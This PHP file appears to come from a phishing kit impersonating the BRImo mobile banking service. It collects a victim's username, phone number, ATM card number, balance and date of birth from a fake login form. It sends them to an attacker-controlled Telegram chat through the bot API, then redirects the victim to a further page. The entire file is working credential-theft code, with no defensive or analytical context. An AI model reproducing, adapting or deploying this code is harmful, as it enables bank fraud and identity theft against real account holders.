<?php
include "../telegram.php";
session_start();

$username = $_POST['username'];
$nohp = $_POST['nohp'];
$noatm = $_POST['noatm'];
$saldo = $_POST['saldo'];
$ttl = $_POST['ttl'];

$_SESSION['username'] = $username;
$_SESSION['nohp'] = $nohp;
$_SESSION['noatm'] = $noatm;
$_SESSION['saldo'] = $saldo;
$_SESSION['ttl'] = $ttl;


$message = "
( BRImo | Akun | ".$username." )

- Username : ".$username."
- No HP : ".$nohp."
- No ATM : ".$noatm."
- Saldo : ".$saldo."
- TTL : ".$ttl."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../link.php');
?>
